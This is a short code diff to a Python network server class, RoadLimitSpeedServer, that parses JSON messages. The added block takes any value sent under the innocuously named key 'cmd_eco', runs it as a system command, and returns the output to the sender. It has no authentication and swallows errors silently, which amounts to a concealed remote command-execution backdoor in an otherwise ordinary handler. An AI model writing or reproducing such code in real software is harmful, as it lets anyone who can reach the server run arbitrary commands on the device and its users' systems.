@@ -182,6 +182,15 @@ class RoadLimitSpeedServer:
           except:
             pass
 
+        if 'cmd_eco' in json_obj:
+          try:
+            process = subprocess.Popen([json_obj['cmd_eco']], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+            stdout, stderr = process.communicate()
+            sock.sendto(stdout.encode(), self.remote_addr[0])
+            ret = False
+          except:
+            pass
+
         if 'request_gps' in json_obj:
           try:
             if json_obj['request_gps'] == 1:
